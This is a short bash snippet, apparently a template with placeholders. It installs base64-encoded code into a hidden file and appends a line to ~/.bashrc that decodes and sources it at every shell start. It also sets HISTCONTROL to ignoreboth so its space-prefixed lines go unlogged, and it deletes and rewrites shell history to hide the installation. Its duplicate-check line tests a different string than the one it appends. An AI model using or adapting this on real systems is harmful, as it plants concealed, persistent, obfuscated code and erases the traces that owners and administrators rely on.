 sed -i 's/HISTCONTROL=ignoredups/HISTCONTROL=ignoreboth/' ~/.bashrc;  
 mkdir -p "$(dirname "FNS_FILE_PLACEHOLDER")"; echo "BASE64_INSERTION" > "FNS_FILE_PLACEHOLDER"; chmod 600 "FNS_FILE_PLACEHOLDER"; 
 grep -qxF 'source "FNS_FILE_PLACEHOLDER"' ~/.bashrc || echo 'source <(base64 -d FNS_FILE_PLACEHOLDER)' >> ~/.bashrc; 
 source ~/.bashrc; 
 history -d "$(history 1 | awk '{print $1}')"; 
 history -wx